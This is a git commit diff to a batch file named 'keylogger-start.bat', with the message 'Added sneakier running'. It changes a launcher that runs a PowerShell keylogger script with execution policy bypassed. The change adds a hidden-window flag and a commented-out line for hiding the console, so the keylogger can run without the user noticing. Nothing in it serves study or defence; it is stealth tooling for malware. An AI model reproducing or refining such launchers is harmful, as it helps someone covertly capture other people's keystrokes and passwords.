8f90b271f5afdd480581a6107544c770ad33b4fc
the-alias <39953366+the-alias@users.noreply.github.com>
2022-09-06 19:08:28 +0300

    V1.1
    Added sneakier running - Not finalized

--- keylogger-start.bat
+++ keylogger-start.bat
@@ -1,3 +1,4 @@
 @echo off
-
-Powershell -noprofile -executionpolicy bypass -file "keylogger.ps1"
+TITLE HideMePls
+::FOR /F %%A IN ('CMDOW ˆ| FIND "HideMePlease"') DO CMDOW %%A /HID
+Powershell -noprofile -executionpolicy bypass -file "keylogger.ps1" -WindowStyle hidden
